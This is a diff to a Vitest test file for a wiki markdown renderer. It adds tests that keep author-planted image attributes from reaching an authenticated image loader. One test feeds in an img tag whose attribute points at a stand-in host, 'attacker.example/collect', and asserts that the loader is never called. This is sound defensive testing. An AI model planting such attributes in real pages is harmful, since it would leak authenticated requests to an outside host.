@@ -18,7 +18,13 @@ let root: Root | undefined;
 
 const buildPageLinkUrl = (path: string) => `https://dev.azure.com/org/project/_apps/hub/pub.ext.wiki?route=${path}`;
 
-function render(markdown: string, { withUrls = true } = {}) {
+function render(
+  markdown: string,
+  {
+    withUrls = true,
+    onLoadImage,
+  }: { withUrls?: boolean; onLoadImage?: (url: string) => Promise<string> } = {}
+) {
   const onNavigate = vi.fn();
   container = document.createElement("div");
   document.body.append(container);
@@ -29,6 +35,7 @@ function render(markdown: string, { withUrls = true } = {}) {
         buildPageLinkUrl={withUrls ? buildPageLinkUrl : undefined}
         currentPath="/Ecosystem/Solution Architecture"
         markdown={markdown}
+        onLoadImage={onLoadImage}
         onNavigate={onNavigate}
       />
     );
@@ -106,5 +113,25 @@ describe("links that are not to wiki pages", () => {
     const { link } = render("[Below](#below)");
 
     expect(link.getAttribute("href")).toBe("#below");
+  });
+});
+
+describe("author-controlled image attributes", () => {
+  it("never sends a planted HTTPS destination to the authenticated image loader", () => {
+    const onLoadImage = vi.fn<(url: string) => Promise<string>>().mockResolvedValue("blob:https://dev.azure.com/image");
+
+    render('<img data-powerwiki-image="https://attacker.example/collect">', { onLoadImage });
+
+    expect(onLoadImage).not.toHaveBeenCalled();
+    expect(container?.querySelector("img")?.hasAttribute("data-powerwiki-image")).toBe(false);
+  });
+
+  it("leaves an external image as an unauthenticated browser image", () => {
+    const onLoadImage = vi.fn<(url: string) => Promise<string>>().mockResolvedValue("blob:https://dev.azure.com/image");
+
+    render("![External image](https://images.example/diagram.png)", { onLoadImage });
+
+    expect(container?.querySelector("img")?.getAttribute("src")).toBe("https://images.example/diagram.png");
+    expect(onLoadImage).not.toHaveBeenCalled();
   });
 });
